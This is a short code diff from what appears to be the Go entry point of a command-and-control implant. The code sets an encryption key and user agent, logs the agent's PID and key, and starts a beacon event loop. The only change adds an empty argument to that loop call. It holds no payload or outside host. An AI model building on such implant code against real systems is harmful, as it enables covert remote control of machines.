@@ -42,5 +42,5 @@ func main() {
 	util.EncryptionKey = &agent.AESKey
 	sockets.UA = &agent.Useragent
 	util.DebugLogf("[%s] agent at PID %d using key %s", agent.Address, agent.Pid, key)
-	sockets.EventLoop(agent, agent.BuildBeacon())
+	sockets.EventLoop(agent, agent.BuildBeacon(), "")
 }
